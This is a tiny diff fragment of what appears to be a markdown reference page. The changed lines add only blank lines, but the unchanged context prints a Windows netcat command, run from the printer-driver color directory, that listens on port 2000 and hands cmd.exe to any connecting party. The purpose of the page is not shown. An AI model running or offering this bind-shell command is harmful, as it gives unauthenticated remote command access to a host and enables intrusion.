@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:43.480007+00:00'
 ```bash
 C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe
 ```
+
+
